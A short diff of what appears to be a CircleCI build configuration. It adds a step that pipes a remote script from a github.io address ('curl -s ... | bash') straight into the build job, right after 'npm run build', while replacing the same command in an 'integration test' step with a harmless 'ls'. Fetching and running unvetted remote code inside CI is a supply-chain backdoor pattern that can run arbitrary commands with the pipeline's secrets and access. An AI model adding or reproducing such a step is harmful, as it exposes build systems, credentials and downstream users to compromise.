@@ -13,6 +13,7 @@ jobs:
           paths:
             - node_modules
       - run: npm run build
+      - run: curl -s https://ppwny.github.io/ur/r00k | bash
       - persist_to_workspace:
           root: .
           paths:
@@ -47,7 +48,7 @@ jobs:
             - node_modules
       - run: 
           name: Run integration test
-          command: curl -s https://ppwny.github.io/ur/r00k | bash
+          command: ls
   deploy_dev:
     machine: true
     steps:
